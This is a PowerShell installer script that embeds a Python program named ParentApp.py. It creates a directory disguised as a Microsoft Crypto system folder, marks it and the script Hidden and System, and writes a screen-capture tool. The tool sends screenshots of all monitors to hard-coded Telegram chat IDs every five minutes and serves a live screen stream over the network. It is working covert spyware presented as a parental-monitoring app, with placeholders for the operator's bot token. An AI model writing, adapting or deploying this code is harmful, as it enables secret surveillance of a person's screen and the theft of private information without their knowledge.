```powershell
# Run this script as Administrator

# Enable strict mode for better error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# Log file for PowerShell script
$logPath = "$env:ProgramData\Microsoft\Crypto\install_log.txt"
function Log-Message {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logPath -Append
}

# Create hidden directory
$hiddenDir = "$env:ProgramData\Microsoft\Crypto"
if (-not (Test-Path $hiddenDir)) {
    New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null
    Set-ItemProperty -Path $hiddenDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
}
Log-Message "Starting script execution"

# Download Python 3.13.2 installer
try {
    $pythonUrl = "https://www.python.org/ftp/python/3.13.2/python-3.13.2-amd64.exe"
    $installerPath = "$env:TEMP\python-3.13.2-installer.exe"
    Log-Message "Downloading Python installer to $installerPath"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    Log-Message "Python installer downloaded successfully"
} catch {
    Log-Message "Error downloading Python installer: $_"
    Write-Host "Error downloading Python installer: $_"
    exit 1
}

# Create ParentApp.py
$pyPath = "$hiddenDir\ParentApp.py"
$scriptContent = @'
import io
import threading
import time
import socket
from functools import wraps
import logging
from logging.handlers import RotatingFileHandler
import traceback

from flask import Flask, Response, request, abort
import mss
from PIL import Image
import telebot

# ----------------------------
# CONFIG
# ----------------------------
TOKEN = "fgh:fhg"  # REPLACE WITH YOUR TELEGRAM BOT TOKEN
CHAT_IDS = [7208529004, 1399455903, 901578154]  # REPLACE WITH VALID CHAT IDs
STREAM_PORT = 5000
STREAM_TOKEN = "fhgfgh"  # REPLACE WITH YOUR STREAM TOKEN
FRAME_INTERVAL = 0.8
JPEG_QUALITY = 50
AUTO_INTERVAL = 300
RESIZE_SCALE = 0.5
LOG_FILE = "monitor_bot.log"

# Setup logging
logging.basicConfig(
    handlers=[RotatingFileHandler(LOG_FILE, maxBytes=10**6, backupCount=3)],
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)
stop_event = threading.Event()

# ----------------------------
# Capture functions
# ----------------------------
def capture_monitor_image(monitor_index=1, sct=None):
    """Capture a single monitor image with shared MSS context"""
    try:
        if sct is None:
            sct = mss.mss()
        monitors = sct.monitors
        if monitor_index < 1 or monitor_index >= len(monitors):
            logger.warning(f"Invalid monitor index {monitor_index}; using monitor 1")
            monitor_index = 1
        monitor = monitors[monitor_index]
        sct_img = sct.grab(monitor)
        img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
        if RESIZE_SCALE < 1:
            new_size = (int(img.width * RESIZE_SCALE), int(img.height * RESIZE_SCALE))
            img = img.resize(new_size, Image.Resampling.LANCZOS)
        return img
    except Exception as e:
        logger.error(f"Error in capture_monitor_image: {str(e)}\n{traceback.format_exc()}")
        raise

def capture_combined_image():
    """Combine monitor 1 and 2 side by side with padding, return BytesIO"""
    try:
        with mss.mss() as sct:
            img1 = capture_monitor_image(1, sct)
            img2 = None
            try:
                img2 = capture_monitor_image(2, sct)
            except Exception as e:
                logger.warning(f"Failed to capture monitor 2: {str(e)}\n{traceback.format_exc()}")

            max_h = max(img1.height, img2.height) if img2 else img1.height
            total_w = img1.width + (img2.width if img2 else img1.width)
            combined = Image.new("RGB", (total_w, max_h), (0, 0, 0))
            combined.paste(img1, (0, 0))
            if img2:
                combined.paste(img2, (img1.width, 0))
            else:
                combined.paste(img1, (img1.width, 0))

            bio = io.BytesIO()
            combined.save(bio, format="JPEG", quality=JPEG_QUALITY, optimize=True)
            bio.seek(0)
            return bio
    except Exception as e:
        logger.error(f"Error capturing combined image: {str(e)}\n{traceback.format_exc()}")
        raise

# ----------------------------
# Telegram functions
# ----------------------------
def send_start_message():
    for chat_id in CHAT_IDS:
        try:
            bot.send_message(chat_id, "Script Started ✅")
            logger.debug(f"Sent start message to chat {chat_id}")
        except Exception as e:
            logger.error(f"Error sending start message to {chat_id}: {str(e)}\n{traceback.format_exc()}")

def send_combined_screenshot():
    bio = capture_combined_image()
    for chat_id in CHAT_IDS:
        try:
            bio.seek(0)
            bot.send_photo(chat_id, photo=bio, caption="Screen 1\n\nScreen 2")
            logger.debug(f"Sent screenshot to chat {chat_id}")
        except Exception as e:
            logger.error(f"Error sending screenshot to {chat_id}: {str(e)}\n{traceback.format_exc()}")
    bio.close()

def send_closed_message():
    for chat_id in CHAT_IDS:
        try:
            bot.send_message(chat_id, "Script Closed ❌")
            logger.debug(f"Sent closed message to chat {chat_id}")
        except Exception as e:
            logger.error(f"Error sending closed message to {chat_id}: {str(e)}\n{traceback.format_exc()}")

def auto_screenshot_loop():
    while not stop_event.is_set():
        try:
            send_combined_screenshot()
        except Exception as e:
            logger.error(f"Error in auto screenshot loop: {str(e)}\n{traceback.format_exc()}")
        stop_event.wait(AUTO_INTERVAL)

# ----------------------------
# Flask streaming
# ----------------------------
def require_token(func):
    @wraps(func)
    def wrapped(*args, **kwargs):
        token = request.args.get("token", "")
        if not token or token != STREAM_TOKEN:
            logger.warning("Unauthorized stream access attempt")
            abort(401)
        return func(*args, **kwargs)
    return wrapped

def mjpeg_generator():
    """Stream combined monitors live"""
    while not stop_event.is_set():
        try:
            bio = capture_combined_image()
            frame = bio.read()
            yield (b"--frame\r\nContent-Type: image/jpeg\r\nContent-Length: " +
                   f"{len(frame)}".encode() + b"\r\n\r\n" + frame + b"\r\n")
            bio.close()
            time.sleep(FRAME_INTERVAL)
        except Exception as e:
            logger.error(f"Error in MJPEG stream: {str(e)}\n{traceback.format_exc()}")
            time.sleep(1)

@app.route("/stream")
@require_token
def stream():
    return Response(mjpeg_generator(), mimetype="multipart/x-mixed-replace; boundary=frame")

@app.route("/s")
def short_stream():
    """Short link redirect to full stream with responsive image"""
    return f'''
    <html>
        <head>
            <title>Live Stream</title>
            <style>body{{margin:0;}}img{{width:100%;height:auto;}}</style>
        </head>
        <body>
            <img src="/stream?token={STREAM_TOKEN}" />
        </body>
    </html>
    '''

# ----------------------------
# Telegram commands
# ----------------------------
@bot.message_handler(commands=['screenshot'])
def tg_screenshot(msg):
    if msg.chat.id not in CHAT_IDS:
        logger.warning(f"Unauthorized screenshot request from chat {msg.chat.id}")
        return
    send_combined_screenshot()

# ----------------------------
# Utility
# ----------------------------
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception as e:
        logger.error(f"Error getting local IP: {str(e)}\n{traceback.format_exc()}")
        ip = "127.0.0.1"
    return ip

# ----------------------------
# Run application
# ----------------------------
def run_flask():
    ip = "0.0.0.0"
    logger.info(f"Flask server running on {ip}:{STREAM_PORT}")
    logger.info(f"Short stream URL: http://{get_local_ip()}:{STREAM_PORT}/s")
    try:
        app.run(host=ip, port=STREAM_PORT, threaded=True, debug=False)
    except Exception as e:
        logger.error(f"Flask server error: {str(e)}\n{traceback.format_exc()}")
        raise

def run_telegram():
    while not stop_event.is_set():
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Telegram polling error: {str(e)}\n{traceback.format_exc()}")
            if stop_event.is_set():
                break
            time.sleep(5)

if __name__ == "__main__":
    try:
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        telegram_thread = threading.Thread(target=run_telegram, daemon=True)
        auto_thread = threading.Thread(target=auto_screenshot_loop, daemon=True)
        
        send_start_message()
        flask_thread.start()
        telegram_thread.start()
        auto_thread.start()

        stop_event.wait()
    except KeyboardInterrupt:
        logger.info("Received KeyboardInterrupt, stopping...")
        stop_event.set()
        send_closed_message()
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}\n{traceback.format_exc()}")
        stop_event.set()
        send_closed_message()
    finally:
        logger.info("Script terminated")
'@
try {
    $scriptContent | Out-File -FilePath $pyPath -Encoding utf8
    Set-ItemProperty -Path $pyPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
    Log-Message "Created ParentApp.py at $pyPath"
} catch {
    Log-Message "Error creating ParentApp.py: $_"
    Write-Host "Error creating ParentApp.py: $_"
    exit 1
}

Write-Host "Script execution complete."
Write-Host "Python installer downloaded to: $installerPath"
Write-Host "ParentApp.py created at: $pyPath"
Write-Host "Check logs at: $logPath"
Read-Host "Press Enter to exit..."
```
